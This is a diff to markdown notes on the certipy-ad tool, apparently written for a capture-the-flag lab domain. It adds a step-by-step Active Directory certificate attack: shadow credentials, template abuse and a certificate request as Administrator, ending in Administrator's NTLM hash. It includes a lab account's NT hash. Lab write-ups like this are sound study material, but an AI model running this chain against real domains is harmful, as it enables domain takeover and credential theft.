@@ -6,6 +6,8 @@
 
 ### Auth
 
+Return a hash for the account of the private key
+
 Example: certipy-ad auth -pfx ./administrator.pfx -dc-ip 10.129.251.172
 
 ### Find
@@ -38,10 +40,28 @@ Might need to be run multiple times to work
 certipy-ad shadow auto -u <username>@<domain_name> -p '<password>' -dc-ip <domain_controller_ip> -ns <dns_server_ip> -target <domain_controller_name>.<domain_name> -account <username_victim>
 ```
 
-Example : certipy-ad shadow auto -u ryan@sequel.htb -p 'WqSZAF6CysDQbGb3' -dc-ip 10.129.251.172 -ns 10.129.251.172 -target dc01.sequel.htb -account ca_svc
+Example : certipy-ad shadow auto -u ryan@sequel.htb -p '<password>' -dc-ip 10.129.251.172 -ns 10.129.251.172 -target dc01.sequel.htb -account ca_svc
 
 ### Template
 
 This specifies the Kerberos template to use when requesting a Kerberos ticket. This template is used when performing actions like generating tickets or performing Kerberos-based attacks (like Pass-the-Ticket (PTT) or Golden Ticket).
 
 Example: KRB5CCNAME=$PWD/ca_svc.ccache certipy-ad template -k -template DunderMifflinAuthentication -target dc01.sequel.htb -dc-ip 10.129.251.172
+
+
+## Examples
+
+### Shadow Credentials
+
+Do a shadow crendentials attack to get a TGT for the account ca_svc
+
+    certipy-ad shadow auto -u ryan@sequel.htb -p '<password>' -dc-ip 10.129.251.172 -ns 10.129.251.172 -target dc01.sequel.htb -account ca_svc
+
+With the TGT of ca_svc specify a template and get a private key for the Administrator account:
+
+    KRB5CCNAME=$PWD/ca_svc.ccache certipy-ad template -k -template DunderMifflinAuthentication -target dc01.sequel.htb -dc-ip 10.129.251.172
+    certipy-ad req -u ca_svc -hashes :3b181b914e7a9d5508ea1e20bc2b7fce -ca sequel-DC01-CA -target DC01.sequel.htb -dc-ip 10.129.251.172 -template DunderMifflinAuthentication -upn Administrator@sequel.htb -ns 10.129.251.172 -dns 10.129.251.172
+
+Finally authenticate with the private key and get the NTLM hash for the Administrator account:
+
+    certipy-ad auth -pfx ./administrator_10.pfx -dc-ip 10.129.251.172
